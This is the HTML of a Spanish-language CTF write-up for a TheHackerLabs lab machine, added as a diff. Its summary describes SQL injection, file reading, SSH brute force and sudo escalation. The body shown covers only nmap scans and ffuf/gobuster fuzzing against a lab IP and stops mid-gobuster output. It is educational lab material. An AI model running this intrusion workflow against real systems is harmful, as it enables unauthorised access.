@@ -1,0 +1,1446 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bocata de Calamares - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-bocataCalamares/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Bocata de Calamares - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-bocataCalamar/bocata_de_calamares.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-runners/">
+          <span class="side-post-card-title">Runners</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-cachopo/">
+          <span class="side-post-card-title">Cachopo</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Bocata de Calamares</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-debugsec/">
+          <span class="side-post-card-title">Debugsec</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-campanaFeliz/">
+          <span class="side-post-card-title">Campana Feliz</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Easy Machine</div>
+    
+    <h1>Bocata de Calamares - TheHackerLabs</h1>
+    <div class="post-meta">24 July 2025 · 15 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-bocataCalamar/bocata_de_calamares.png" alt="Bocata de Calamares - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina fácil. Después de analizar los escaneos, vamos directo a la página web activa en el puerto 80, siendo una página de fake news. Aplicando Fuzzing, descubrimos un login al que es posible aplicarle Inyecciones SQL. Gracias a esto, ganamos acceso a este login y encontramos una lista por hacer, en la que menciona un lector de archivos internos, al que codificaron su nombre en base64. Encontramos y analizamos el lector de archivos internos, este nos permite leer archivos como el /etc/passwd. Además, encontramos una pista en el código fuente, mencionando que se le puede aplicar fuerza bruta a un usuario del servicio SSH. Le aplicamos fuerza bruta con hydra a uno de los usuarios que vimos en el /etc/passwd, y ganamos acceso principal a la máquina víctima vía SSH. Revisamos los privilegios de este usuario, descubriendo que podemos usar el binario find como Root. Utilizando la guía de GTFOBins, encontramos una forma de escalar privilegios, convirtiéndonos en Root.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>ffuf</code></li><li><code>gobuster</code></li><li><code>nano</code></li><li><code>sqlmap</code></li><li><code>wfuzz</code></li><li><code>echo</code></li><li><code>base64</code></li><li><code>hydra</code></li><li><code>ssh</code></li><li><code>cat</code></li><li><code>sudo</code></li><li><code>find</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SQLi">Aplicando Inyecciones SQL de Distintas Maneras</a>
+          <ul>
+            <li><a href="#SQLiManual">Aplicando Inyección SQL Básica de Forma Manual para Ganar Acceso a Login</a></li>
+            <li><a href="#SQLMAP">Automatizando Inyecciones SQL con SQLMAP para Dumpear Datos de Base de Datos</a></li>
+            <li><a href="#wfuzz">Aplicando Fuzzing a Campo Vulnerable a SQLi con wfuzz</a></li>
+          </ul>
+        </li>
+        <li><a href="#admin">Analizando Página Web admin.php y Lector de Archivos Internos</a></li>
+        <li><a href="#FuerzaBruta">Aplicando Fuerza Bruta a Usuario del Servicio SSH y Ganando Acceso a la Máquina Víctima</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#find">Escalada de Privilegios con Permisos Sudoers sobre Binario find</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SQLi">Aplicando Inyecciones SQL de Distintas Maneras</a>
+          <ul>
+            <li><a href="#SQLiManual">Aplicando Inyección SQL Básica de Forma Manual para Ganar Acceso a Login</a></li>
+            <li><a href="#SQLMAP">Automatizando Inyecciones SQL con SQLMAP para Dumpear Datos de Base de Datos</a></li>
+            <li><a href="#wfuzz">Aplicando Fuzzing a Campo Vulnerable a SQLi con wfuzz</a></li>
+          </ul>
+        </li>
+        <li><a href="#admin">Analizando Página Web admin.php y Lector de Archivos Internos</a></li>
+        <li><a href="#FuerzaBruta">Aplicando Fuerza Bruta a Usuario del Servicio SSH y Ganando Acceso a la Máquina Víctima</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#find">Escalada de Privilegios con Permisos Sudoers sobre Binario find</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.10.220
+</span></span><span style="display:flex;"><span>PING 192.168.10.220 <span style="color:#f92672">(</span>192.168.10.220<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.220: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.89 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.220: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.56 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.220: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.29 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.220: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.35 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.10.220 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3032ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 1.290/1.522/1.888/0.234 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.10.220 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-07-24 12:29 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 12:29
+</span></span><span style="display:flex;"><span>Scanning 192.168.10.220 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 12:29, 0.12s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:29
+</span></span><span style="display:flex;"><span>Scanning 192.168.10.220 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.10.220
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.10.220
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:29, 6.99s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.220
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00100s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-07-24 12:29:26 CST <span style="color:#66d9ef">for</span> 7s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.30 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.884MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.621MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Solo hay 2 puertos abiertos, así que supongo que la intrusión será por el <strong>puerto 80</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,80 192.168.10.220 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-07-24 12:29 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.220
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00080s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a6:3f:47:73:4c:6d:b3:23:29:fa:f8:1f:1d:42:44:b9 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 11:b8:dc:df:a9:c1:9f:b5:8f:55:93:a4:ef:65:c8:d5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.24.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: AFN
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.07 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Parece que en la página web activa del <strong>puerto 80</strong> no está vacía. Además, está utilizando <strong>nginx</strong> como servidor.</p>
+<p>Vamos a verla.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura1.png">
+</p>
+<p>Una página web de fake news, qué interesante.</p>
+<p>Veamos qué nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura2.png">
+</p>
+<p>No hay más de lo que ya sabemos.</p>
+<p>Viendo un poco el contenido, resulta que hay una página que nos advierte sobre las <strong>Inyecciones SQL</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura3.png">
+</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-bocataCalamar/Captura4.png">
+</p>
+<p>Al entrar, veremos información sobre cómo aplicar una <strong>Inyección SQL</strong> básica que prueba si un formulario de inicio de sesión es vulnerable, que es muy buena información.</p>
+<p>Pero, no encontraremos algo más y tampoco en el código fuente.</p>
+<p>Entonces, vamos a aplicar <strong>Fuzzing</strong> que se enfoque en <strong>archivos PHP</strong>.</p>
+<h3 id="fuzz">Fuzzing</h3>
+<p>Primero, usemos la herramienta <strong>ffuf</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.10.220/FUZZ -t <span style="color:#ae81ff">300</span> -e .php,.txt,.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://192.168.10.220/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span> :: Extensions       : .php .txt .html 
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>index.php               <span style="color:#f92672">[</span>Status: 200, Size: 4145, Words: 898, Lines: 96, Duration: 13ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>login.php               <span style="color:#f92672">[</span>Status: 200, Size: 2543, Words: 743, Lines: 98, Duration: 31ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>images                  <span style="color:#f92672">[</span>Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 24ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>admin.php               <span style="color:#f92672">[</span>Status: 200, Size: 359, Words: 22, Lines: 14, Duration: 167ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">[</span>Status: 200, Size: 4145, Words: 898, Lines: 96, Duration: 80ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>882180/882180<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">1802</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:06:46<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-e</em></td>
+					<td>Para indicar extensiones de archivos a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.10.220/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">300</span> -x php,html,txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://192.168.10.220/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php,html,txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
